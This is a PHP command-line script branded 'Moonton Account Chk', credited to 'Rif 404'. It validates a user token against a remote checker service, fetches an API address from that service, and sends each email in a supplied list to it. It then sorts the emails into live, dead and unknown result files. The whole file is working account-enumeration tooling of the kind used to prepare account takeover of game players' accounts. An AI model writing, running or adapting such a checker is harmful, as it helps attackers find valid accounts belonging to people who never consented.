<?php
$cekwget = function_exists('file_get_contents') ? 'Enabled' : 'Disabled (Tools Not Working)';
$versiphp = phpversion();
echo "_____________________________________________________________________\n";
echo "                         |                                           |\n";
echo "   ####################  |  Name     :  Moonton Account Chk          |\n";
echo "   #  #      #   #  #    |  Version  :  2.0                          |\n";
echo "   #  ############  #    |___________________________________________|\n";
echo "   #  #      #   ######  |  \n";
echo "   #  #      #   ######  |  Get Func :  $cekwget\n";
echo "   #  ############  #    |  Php      :  $versiphp\n";
echo "   #  #      #   #  #    |                      [Released in apr 2020]\n";
echo "   ####################  |___________________________________________|\n";
echo "_________________________|     Made by Rif 404                  l\n";
echo "_____________________________________________________________________|\n";
echo "_____________________________________________________________________|\n";
echo "_____________________________________________________________________|\n";
echo "\n\n";
echo "[?][] Your Access Token : ";
$token = trim(fgets(STDIN));
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, "https://checker.arvix.my.id/api/check-token?token=$token");
curl_setopt($ch2, CURLOPT_RETURNTRANSFER,true); 
$result2 = curl_exec($ch2);    
curl_close($ch2);
if($result2 == '200 ok'){
	
	
$ch10 = curl_init();
curl_setopt($ch10, CURLOPT_URL, "https://checker.arvix.my.id/get-url.php?chk_id=4");
curl_setopt($ch10, CURLOPT_RETURNTRANSFER,true); 
$result10 = curl_exec($ch10);    
curl_close($ch10);

if(!$result10){
echo "[!][] Error to find SERVER API\n";
}else{
	
$server_api = $result10;
////////////////////start
echo "Enter List file : ";
$file = trim(fgets(STDIN));
if(!file_exists($file)){
echo "File Not Found!\n";
echo "Press enter to abort operation!\n";
$toes = trim(fgets(STDIN));
}else{
echo "New Folder Name to Save Result : ";
$folder = trim(fgets(STDIN));
if(!$folder){
echo "Folder Name Not Found!\n";
echo "Press enter to abort operation!\n";
$toes = trim(fgets(STDIN));
}else{
mkdir("$folder");
echo "\n\n";
echo "++---==========[  By Borayach  ]==========---++\n";
echo "\n\n";
$i = 1;
$fh = fopen("$file", "r"); 
while(true){
$line = fgets($fh);
if($line == null)break;
$email = trim($line);
$ch5 = curl_init();
curl_setopt($ch5, CURLOPT_URL, "$server_api?token=$token&email=$email");
curl_setopt($ch5, CURLOPT_RETURNTRANSFER,true); 
$result5 = curl_exec($ch5);    
curl_close($ch5);
$ekstakgan = json_decode($result5,true);
if(!$result5){
echo "[!][] Error Get Response";	
}else
if($ekstakgan['response'] == '200'){
if($ekstakgan['status'] == 'live'){
echo "[-][] [LIVE] [$email]\n";	
	$fhz = fopen("$folder/live.txt", "a+"); 
	$stringData = "live => $email\n";
	fwrite($fhz, $stringData);
	fclose($fhz);
}else{
echo "[-][] [DEAD] [$email]\n";
	$fhz = fopen("$folder/dead.txt", "a+"); 
	$stringData = "dead => $email\n";
	fwrite($fhz, $stringData);
	fclose($fhz);
}
}else{
echo "[-][] [Unknown] [$email]\n";
	$fhz = fopen("$folder/unknown.txt", "a+"); 
	$stringData = "unknown => $email\n";
	fwrite($fhz, $stringData);
	fclose($fhz);
}


$i++;
} 
fclose($fh);
echo "\n\n\n";
echo "[]=============================================\n";
echo "[]====[ Coded by Rif 404 ]=====>>>>>>>>>>>>>>>\n";
echo "[]=============================================\n";
echo "[]Live result saved in => $folder/live.txt\n";
echo "[]Unknown result saved in => $folder/unknown.txt\n";
echo "[]Dead result saved in => $folder/dead.txt\n";
}
}
////////////////////end
}
}else{
echo "[!]Token Invalid";
}	
?>
